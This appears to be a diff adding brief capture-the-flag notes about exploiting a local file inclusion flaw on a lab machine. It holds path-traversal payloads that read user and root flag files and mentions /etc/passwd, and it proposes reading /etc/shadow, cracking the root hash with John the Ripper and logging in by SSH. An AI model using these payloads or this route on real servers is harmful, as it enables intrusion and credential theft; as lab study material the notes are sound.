@@ -1,0 +1,9 @@
+We know user "falconfeast" exists after reading the etc/passwd file
+
+User flag: --snip--?name=../../../../home/falconfeast/user.txt
+Root flag: --snip--?name=../../../../root/root.txt
+
+* LFI with access to the /root path?
+Interesting, we could also cat the content of /etc/shadow get the root SHA512crypt hash and crack it with John the Ripper then log into the server via SSH!
+
+Whichever works best for you :-)
